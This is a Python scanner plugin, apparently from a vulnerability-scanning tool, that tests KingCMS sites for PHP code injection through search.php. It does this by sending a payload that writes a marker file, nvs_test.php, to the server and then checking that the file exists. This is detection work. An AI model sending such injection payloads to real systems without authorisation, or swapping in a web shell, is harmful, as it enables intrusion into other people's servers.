#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = ""
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl ="%s%s"%(url, "search.php?query=facked';?><?fputs(fopen('nvs_test.php','w'),base64_decode('VGVzdCBmb3IgbnZzX2tpbmdjbXM='));?>&modelid=1%20or%202=2")
        yzurl="%s%s"%(url,"nvs_test.php")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        r,c=requestUrl(http,yzurl,ob['task_id'],ob['domain_id'])
        if c.find('Test for nvs_kingcms')>=0 and r['status']!='404':
            request = getRequest(expurl,'GET')
            response = getResponse(res)
            list.append(getRecord(ob,yzurl,ob['level'],detail,request,response))
        
                
    except Exception,e:
        logging.getLogger().error("File:kingcmsexecutescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:kingcmsexecutescript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def